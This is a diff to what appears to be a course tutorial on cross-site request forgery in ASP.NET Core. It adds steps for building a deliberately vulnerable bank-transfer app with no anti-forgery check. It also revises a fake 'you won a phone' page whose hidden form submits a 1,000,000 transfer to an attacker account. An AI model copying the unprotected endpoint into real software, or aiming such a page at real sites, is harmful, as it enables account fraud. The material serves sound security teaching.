@@ -18,6 +18,87 @@ Cross-site request forgery (also known as XSRF or CSRF, pronounced see-surf) is 
 
 > Recommended further reading: OWASP (description of the vulnerability in general): https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF); CSRF in ASP.NET: https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-2.2 
 
+# Vulnerable website - IronBank Web'Banking
+
+## Step 1 - Create an application with individual user accounts
+
+1. Create a new ASP.NET Core Web Application project. 
+
+2. Choose the "Web Application (Model-View-Controller)" template. Select the "Indvidual User Accounts" as an authentication option, as shown below.
+
+    ![](media/change-authentication.png)
+
+3. Notice that in the `Data` folder the applciation already includes the necessary database migrations.
+
+4. Create an SQL Server database and update the connection string in `appsettings.json`.
+
+5. Run the application.
+
+6. Choose the "Register" link and create a new account.
+
+## Step 2 - Add the CSRF vulnerable webpage
+
+1. Add a new controller, called `BankAccountController`.
+2. Decorate the controller using the `[Authorize]` annotation in order to prevent any unauthenticated requests towards the actions on this controller.
+2. Add an action called `Transfer` to the `BankAccountController` as follows.
+
+    ```C#
+    public IActionResult Transfer()
+    {
+        return View();
+    }
+    ```
+
+3. Add a new viewmodel class to the `Models` folder.
+
+    ```C#
+    public class TransferViewModel
+    {
+        public string DestinationAccount { get; set; }
+        public decimal Amount { get; set; }
+    }
+    ```
+
+4. Add a new View for the `Transfer` action.
+
+    ```CSHTML
+    @model TransferViewModel
+    @{
+        ViewData["Title"] = "Transfer";
+    }
+
+    <h2>Transfer</h2>
+
+    @if(ViewBag.Message != null)
+    {
+        <div class="alert alert-danger">
+            @ViewBag.Message
+        </div>
+    }
+
+    <form method="post">
+        <label asp-for="DestinationAccount"></label>
+        <input asp-for="DestinationAccount" />
+        <label asp-for="Amount"></label>
+        <input asp-for="Amount" />
+        <input type="submit" />
+    </form>
+    ```
+
+5. Add a POST method for the form in the View
+
+    ```C#
+    [HttpPost]
+    public IActionResult Transfer(TransferViewModel transfer)
+    {
+        if(ModelState.IsValid)
+        {
+            ViewBag.Message = $"You have transfered {transfer.Amount} euros to {transfer.DestinationAccount}.";
+        }
+        return View(transfer);
+    }
+    ```
+
 # Malicious or infected web site
 
 > :octocat: Full source code available, check the `8 - Vulnerabilities - CSRF (Cross-Site Request Forgery)` folder.
@@ -37,7 +118,7 @@ Cross-site request forgery (also known as XSRF or CSRF, pronounced see-surf) is 
             <h1>Congratulations!</h1>
             <h1>You have won a Samsung Galaxy Fold (2.000 euros)!!!!</h1>
             <form action="http://good-banking-site.com/api/account" method="post">
-                <input type="hidden" name="Transaction" value="withdraw">
+                <input type="hidden" name="DestinationAccount" value="RO85INGBXXXXXXXXXX">
                 <input type="hidden" name="Amount" value="1000000">
                 <input type="submit" value="Click to collect your prize!">
             </form>
@@ -47,7 +128,7 @@ Cross-site request forgery (also known as XSRF or CSRF, pronounced see-surf) is 
     </html>
     ```
 
-2. You will need to replace "http://good-banking-site.com/api/account" with the actual address of the vulnerable website.
+2. You will need to replace "http://good-banking-site.com/api/account" with the actual address of the vulnerable form (ex: https://localhost:5001/BankAcount/Transfer).
 
 ##  3. <a name='Bibliography'></a>Bibliography
 - Prevent Cross-Site Request Forgery (XSRF/CSRF) attacks in ASP.NET Core: https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?
